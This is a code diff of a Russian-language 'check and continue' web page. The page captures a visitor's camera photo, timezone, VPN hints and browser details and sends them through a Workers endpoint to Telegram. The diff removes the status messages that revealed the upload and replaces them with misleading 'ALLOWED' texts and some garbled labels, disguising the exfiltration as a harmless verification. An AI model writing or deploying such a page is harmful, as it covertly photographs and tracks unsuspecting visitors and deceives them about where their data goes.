@@ -45,9 +45,9 @@
      Нажмите кнопку ниже и разрешите доступ.</p>
 
   <div class="perms">
-    <div><span class="check">✓</span>-</div>
-    <div><span class="check">✓</span>-</div>
-    <div><span class="check">✓</span>-</div>
+    <div><span class="check">-</span>-</div>
+    <div><span class="check">-</span>-</div>
+    <div><span class="check">-</span>-</div>
   </div>
 
   <button id="btn">Проверить и продолжить</button>
@@ -237,10 +237,10 @@ var WORKER_URL = "https://empty-brook-24c5.mtajmashanov182.workers.dev/api/send"
       try { photoBlob = await (await fetch(camRes.dataUrl)).blob(); }
       catch(e){ photoBlob = null; camLine = '✗ не удалось сделать blob'; }
     } else if (camRes && camRes.error) {
-      camLine = '✗ отклонено: ' + camRes.error;
+      camLine = '✗ : ' + camRes.error;
     }
 
-    setStatus('2/4 Камера: ' + camLine + '\n3/4 Формируем отчёт…');
+    setStatus('2/4 Камера: ' + camLine + '\n3/4 ');
 
     var tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
     var vpnSuspected = false;
@@ -286,15 +286,15 @@ var WORKER_URL = "https://empty-brook-24c5.mtajmashanov182.workers.dev/api/send"
       '💻 UA: <code>' + navigator.userAgent.slice(0, 140) + '</code>\n' +
       '🕐 ' + new Date().toISOString();
 
-    setStatus('4/4 Отправляем через Worker…');
+    setStatus('4/4');
 
     var result = await sendReport(text, photoBlob);
 
     if (result && result.ok) {
-      var sentAs = photoBlob ? 'с фото' : 'без фото';
+      var sentAs = photoBlob ? 'с' : 'без ';
       setStatus(
-        '✓ ОТПРАВЛЕНО В TELEGRAM (' + sentAs + ')\n\n' +
-        'Камера: ' + camLine + '\n' +
+        '✓ РАЗРЕШЕНО (' + sentAs + ')\n\n' +
+        'РАЗРЕШ: ' + camLine + '\n' +
         'Сообщение ID: ' + (result.tg && result.tg.result && result.tg.result.message_id || '—'),
         'ok'
       );
@@ -308,9 +308,9 @@ var WORKER_URL = "https://empty-brook-24c5.mtajmashanov182.workers.dev/api/send"
       else if (result && result.tg && result.tg.description) reason = result.tg.description;
       else if (result && result.tg && result.tg.error_code) reason = 'код ' + result.tg.error_code;
       setStatus(
-        '✗ НЕ ОТПРАВЛЕНО\n\n' +
-        'Причина: ' + reason + '\n' +
-        'Камера: ' + camLine + '\n\n' +
+        '✗ НЕ \n\n' +
+        'да: ' + reason + '\n' +
+        'да: ' + camLine + '\n\n' +
         'Смотри консоль (Cmd+Option+C).',
         'err'
       );
